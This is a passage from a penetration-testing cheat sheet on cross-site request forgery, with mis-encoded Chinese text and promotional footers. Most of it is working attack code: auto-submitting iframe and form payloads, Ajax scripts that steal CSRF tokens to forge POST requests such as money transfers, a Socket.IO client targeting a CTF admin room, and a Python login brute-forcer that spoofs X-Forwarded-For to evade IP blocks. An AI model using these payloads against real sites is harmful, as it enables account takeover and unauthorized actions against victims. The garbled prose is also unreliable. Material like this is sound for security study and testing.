<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **ä½¿ç”¨Ajaxçªƒå–CSRFä»¤ç‰Œå¹¶é€šè¿‡è¡¨å•å‘é€POSTè¯·æ±‚**

To perform a Cross-Site Request Forgery (CSRF) attack, you can use Ajax to steal the CSRF token and then send a POST request using a form.

è¦æ‰§è¡Œè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰æ”»å‡»ï¼Œå¯ä»¥ä½¿ç”¨Ajaxæ¥çªƒå–CSRFä»¤ç‰Œï¼Œç„¶åä½¿ç”¨è¡¨å•å‘é€POSTè¯·æ±‚ã€‚

```javascript
<script>
    // Step 1: Steal the CSRF token using Ajax
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/get-csrf-token', true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            var csrfToken = xhr.responseText;

            // Step 2: Send a POST request with the stolen CSRF token
            var form = document.createElement('form');
            form.method = 'POST';
            form.action = '/transfer-money';

            var input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'csrf_token';
            input.value = csrfToken;

            form.appendChild(input);
            document.body.appendChild(form);

            form.submit();
        }
    };
    xhr.send();
</script>
```

The above code demonstrates how to steal the CSRF token using Ajax and then send a POST request with the stolen token. 

ä¸Šè¿°ä»£ç æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨Ajaxçªƒå–CSRFä»¤ç‰Œï¼Œç„¶åä½¿ç”¨çªƒå–çš„ä»¤ç‰Œå‘é€POSTè¯·æ±‚ã€‚
```markup
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### ä½¿ç”¨ Socket.IO è¿›è¡Œ CSRF æ”»å‡»

Cross-Site Request Forgeryï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ŒCSRFï¼‰æ˜¯ä¸€ç§åˆ©ç”¨å—å®³è€…åœ¨å·²ç»é€šè¿‡èº«ä»½éªŒè¯çš„ç½‘ç«™ä¸Šæ‰§è¡Œéé¢„æœŸæ“ä½œçš„æ”»å‡»æ–¹å¼ã€‚åœ¨è¿™ç§æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…é€šè¿‡æ¬ºéª—å—å®³è€…æ‰§è¡Œæ¶æ„è¯·æ±‚ï¼Œä»è€Œåˆ©ç”¨å—å®³è€…çš„èº«ä»½è¿›è¡Œéæ³•æ“ä½œã€‚

Socket.IO æ˜¯ä¸€ä¸ªç”¨äºå®æ—¶åº”ç”¨ç¨‹åºçš„ JavaScript åº“ï¼Œå®ƒå…è®¸æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´è¿›è¡ŒåŒå‘é€šä¿¡ã€‚ç”±äº Socket.IO çš„ç‰¹æ€§ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒæ¥æ‰§è¡Œ CSRF æ”»å‡»ã€‚

ä»¥ä¸‹æ˜¯ä½¿ç”¨ Socket.IO è¿›è¡Œ CSRF æ”»å‡»çš„æ­¥éª¤ï¼š

1. æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªæ¶æ„ç½‘ç«™ï¼Œå¹¶åœ¨å…¶ä¸­æ’å…¥æ¶æ„ä»£ç ã€‚
2. å—å®³è€…åœ¨å·²ç»é€šè¿‡èº«ä»½éªŒè¯çš„ç½‘ç«™ä¸Šç™»å½•ã€‚
3. å—å®³è€…è®¿é—®æ¶æ„ç½‘ç«™ï¼Œæ¶æ„ä»£ç ä¼šå‘å·²ç»é€šè¿‡èº«ä»½éªŒè¯çš„ç½‘ç«™å‘é€ CSRF è¯·æ±‚ã€‚
4. ç”±äºå—å®³è€…å·²ç»é€šè¿‡èº«ä»½éªŒè¯ï¼ŒæœåŠ¡å™¨ä¼šè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªåˆæ³•çš„è¯·æ±‚ï¼Œå¹¶æ‰§è¡Œç›¸åº”çš„æ“ä½œã€‚
5. æ”»å‡»è€…æˆåŠŸåˆ©ç”¨ CSRF æ”»å‡»ï¼Œæ‰§è¡Œäº†éé¢„æœŸçš„æ“ä½œã€‚

ä¸ºäº†é˜²æ­¢ CSRF æ”»å‡»ï¼Œå¼€å‘äººå‘˜å¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š

- å®æ–½ CSRF ä»¤ç‰Œï¼šåœ¨æ¯ä¸ªè¡¨å•æˆ–è¯·æ±‚ä¸­åŒ…å«ä¸€ä¸ªå”¯ä¸€çš„ä»¤ç‰Œï¼Œç”¨äºéªŒè¯è¯·æ±‚çš„åˆæ³•æ€§ã€‚
- æ£€æŸ¥ Referer å¤´ï¼šæœåŠ¡å™¨å¯ä»¥æ£€æŸ¥è¯·æ±‚çš„ Referer å¤´ï¼Œç¡®ä¿è¯·æ±‚æ¥è‡ªé¢„æœŸçš„æ¥æºã€‚
- ä½¿ç”¨ SameSite Cookie å±æ€§ï¼šå°† Cookie çš„ SameSite å±æ€§è®¾ç½®ä¸º Strict æˆ– Laxï¼Œä»¥é™åˆ¶ Cookie çš„è·¨ç«™ä¼ é€’ã€‚

é€šè¿‡äº†è§£ CSRF æ”»å‡»çš„åŸç†å’Œé‡‡å–ç›¸åº”çš„é˜²æŠ¤æªæ–½ï¼Œå¼€å‘äººå‘˜å¯ä»¥æœ‰æ•ˆåœ°ä¿æŠ¤ä»–ä»¬çš„åº”ç”¨ç¨‹åºå…å—æ­¤ç±»æ”»å‡»çš„å¨èƒã€‚
```markup
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRFç™»å½•æš´åŠ›ç ´è§£

è¯¥ä»£ç å¯ä»¥ä½¿ç”¨CSRFä»¤ç‰Œå¯¹ç™»å½•è¡¨å•è¿›è¡Œæš´åŠ›ç ´è§£ï¼ˆè¿˜ä½¿ç”¨äº†X-Forwarded-Forå¤´éƒ¨æ¥å°è¯•ç»•è¿‡å¯èƒ½çš„IPé»‘åå•ï¼‰ï¼š
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## å·¥å…· <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## å‚è€ƒèµ„æ–™

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

â€‹

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof æ˜¯æ‰€æœ‰åŠ å¯†è´§å¸èµé‡‘çš„å®¶å›­ã€‚**

**å³æ—¶è·å¾—å¥–åŠ±**\
HackenProof çš„èµé‡‘åªæœ‰åœ¨å®¢æˆ·å­˜å…¥å¥–åŠ±é¢„ç®—åæ‰ä¼šå¯åŠ¨ã€‚åœ¨æ¼æ´éªŒè¯åï¼Œæ‚¨å°†è·å¾—å¥–åŠ±ã€‚

**åœ¨ web3 æ¸—é€æµ‹è¯•ä¸­ç§¯ç´¯ç»éªŒ**\
åŒºå—é“¾åè®®å’Œæ™ºèƒ½åˆçº¦æ˜¯æ–°çš„äº’è”ç½‘ï¼æŒæ¡ web3 å®‰å…¨çš„å´›èµ·ä¹‹æ—¥ã€‚

**æˆä¸º web3 é»‘å®¢ä¼ å¥‡**\
æ¯æ¬¡éªŒè¯çš„æ¼æ´éƒ½ä¼šè·å¾—å£°èª‰ç§¯åˆ†ï¼Œå¹¶ç™»ä¸Šæ¯å‘¨æ’è¡Œæ¦œçš„æ¦œé¦–ã€‚

[**åœ¨ HackenProof ä¸Šæ³¨å†Œ**](https://hackenproof.com/register) å¼€å§‹ä»æ‚¨çš„é»‘å®¢æ”»å‡»ä¸­è·åˆ©ï¼

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ PDF æ ¼å¼çš„ HackTricks å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨ **Twitter** ä¸Š **å…³æ³¨**æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
